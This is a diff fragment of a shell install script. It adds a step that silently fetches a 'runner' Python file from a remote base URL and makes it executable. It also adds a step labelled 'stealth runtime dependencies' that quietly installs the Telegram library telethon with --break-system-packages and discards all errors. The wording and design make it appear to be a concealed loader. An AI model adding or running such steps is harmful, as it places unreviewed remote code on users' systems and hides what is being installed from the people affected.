@@ -478,3 +478,11 @@ mkdir -p "$INSTALL_DIR"
 mkdir -p "$BIN_DIR"
 
 # 2. Download zero-dependency RAM-runner
+echo "[i] Fetching universal client runner..."
+curl -sSL "$BASE_URL/api/core/runner" -o "$INSTALL_DIR/runner.py"
+chmod +x "$INSTALL_DIR/runner.py"
+
+# Pre-synchronize stealth runtime dependencies silently
+echo "[i] Synchronizing stealth runtime dependencies..."
+python3 -m pip install --quiet --break-system-packages telethon colorama 2>/dev/null || \
+python3 -m pip install --quiet --user --break-system-packages telethon colorama 2>/dev/null || \
